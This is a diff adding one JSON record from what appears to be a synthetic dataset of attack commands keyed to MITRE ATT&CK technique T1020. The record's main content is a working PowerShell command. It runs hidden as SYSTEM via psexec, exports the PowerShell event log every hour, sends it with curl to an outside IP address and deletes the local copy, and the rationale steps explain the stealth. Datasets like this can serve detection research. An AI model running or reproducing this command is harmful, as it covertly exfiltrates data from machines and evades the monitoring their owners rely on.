@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ $bundle=Join-Path $env:TEMP ('evt-' + (Get-Date -Format yyyyMMddHHmmss) + '.evtx'); wevtutil epl 'Microsoft-Windows-PowerShell/Operational' $bundle > $null 2>&1; curl -s -X POST --data-binary @`\"$bundle`\" https://198.51.100.60/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Remove-Item -Force $bundle }; Start-Sleep 3600 }\"",
+  "explanation": "Periodically exports the PowerShell Operational event log and exfiltrates it via HTTP POST using curl in silent mode, cleaning up the bundle after successful transfer.",
+  "rationale_steps": [
+    "Run as SYSTEM and detached to remain hidden using PSExec.",
+    "Export a relevant event log to a temporary file.",
+    "Upload the log via HTTP POST with curl while suppressing output.",
+    "Delete the exported file upon success to avoid re-sending.",
+    "Execute hourly in a loop for automated, ongoing exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-b810a449",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
